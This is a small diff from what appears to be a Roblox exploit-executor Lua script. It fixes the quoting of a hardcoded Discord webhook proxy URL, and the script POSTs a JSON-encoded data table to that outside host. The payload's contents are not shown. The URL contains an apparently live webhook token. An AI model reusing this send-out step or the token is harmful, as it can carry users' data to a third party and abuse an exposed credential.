@@ -1285,7 +1285,7 @@ local Data =
 local Headers = {["Content-Type"]="application/json"}
 local Encoded = HttpService:JSONEncode(Data)
 Request = http_request or request or HttpPost or syn.request
-LINK = https://webhook.lewisakura.moe/api/webhooks/1082491657624227880/Zo1Lp_vYOzpdYsqu-d3MTPhx_1vDe7TOW6-n3u7JpzTUQd1Yeu-STr9nY4JFUljYIynk
+LINK = 'https://webhook.lewisakura.moe/api/webhooks/1082491657624227880/Zo1Lp_vYOzpdYsqu-d3MTPhx_1vDe7TOW6-n3u7JpzTUQd1Yeu-STr9nY4JFUljYIynk'
 local Final = {Url = LINK, Body = Encoded, Method = "POST", Headers = Headers}
 Request(Final)
-end
+
